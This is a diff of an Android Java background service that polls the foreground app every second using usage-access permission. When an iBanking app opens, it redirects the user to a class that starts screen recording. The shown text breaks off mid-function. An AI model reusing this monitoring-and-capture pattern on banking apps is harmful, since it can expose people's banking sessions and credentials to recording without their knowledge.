@@ -10,14 +10,11 @@ import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.support.annotation.NonNull;
 import android.support.v4.app.JobIntentService;
 import android.util.Log;
-import android.widget.ToggleButton;
 
 import java.util.List;
 import java.util.SortedMap;
@@ -25,10 +22,20 @@ import java.util.Timer;
 import java.util.TimerTask;
 import java.util.TreeMap;
 
+/* ExampleJobIntentService is a background service referenced from https://www.youtube.com/watch?v=B4gFbWnNpac,
+ * that would continue to poll in the background to see if user has opened the iBanking app.
+ * This JobIntentService is enqueued from the Initialising class onCreate function through the static enqueueWork function.
+ * The service then schedule a timer, to wake up every 1 second which in turn uses the granted USAGE ACCESS permission
+ * to check what package is currently on the foreground.
+ * When the iBanking app is currently on the foreground, the user will be directed to the BankVPN class to proceed with screen recording.
+ * The service would also detect when screen recording has started and user has exited the iBanking app to direct them back
+ * to the BankVPN class to disable screen recording */
 public class ExampleJobIntentService extends JobIntentService {
     public int counter=0;
     private static final String TAG = "ExampleJobIntentService";
     public Context context;
+    private Timer timer;
+    private TimerTask timerTask;
     public static boolean redirected = false;
 
     static void enqueueWork(Context context, Intent work){
@@ -39,12 +46,10 @@ public class ExampleJobIntentService extends JobIntentService {
     public void onCreate() {
         super.onCreate();
         this.context = getApplicationContext();
-        /*Log.d(TAG, "onCreate: ");*/
     }
 
     @Override
     protected void onHandleWork(@NonNull Intent intent){
-        /*Log.d(TAG, "onHandleWork: ");*/
         if (isStopped()) return;
         startTimer();
     }
@@ -52,19 +57,14 @@ public class ExampleJobIntentService extends JobIntentService {
     @Override
     public void onDestroy() {
         super.onDestroy();
-
-        /*Log.d(TAG, "onDestroy: ");*/
     }
 
     @Override
     public boolean onStopCurrentWork() {
-        /*Log.d(TAG, "onStopCurrentWork: ");*/
         return super.onStopCurrentWork();
     }
 
-    private Timer timer;
-    private TimerTask timerTask;
-    long oldTime=0;
+    /* Start the timer and schedules the timer, to wake up every 1 second */
     public void startTimer() {
         //set a new Timer
         timer = new Timer();
@@ -76,17 +76,20 @@ public class ExampleJobIntentService extends JobIntentService {
         timer.schedule(timerTask, 1000, 1000); //
     }
 
+    /* Function defines the timer task to be done */
     public void initializeTimerTask() {
         timerTask = new TimerTask() {
             public void run() {
                 retriveNewApp();
-                /*Log.i("in timer", "in timer ++++  "+ (counter++));*/
                 counter++;
             }
         };
     }
 
-
+    /* Function checks which package is on the foreground and check if iBanking app is opened by user
+     * If iBanking app is opened by the user, the user will be directed to the BankVPN class to proceed with screen recording.
+     * It also detect when screen recording has already started and user has exited the iBanking app to direct them back
+     * to the BankVPN class to disable screen recording */
     private String retriveNewApp() {
         if (Build.VERSION.SDK_INT >= 21) {
             String currentApp = null;
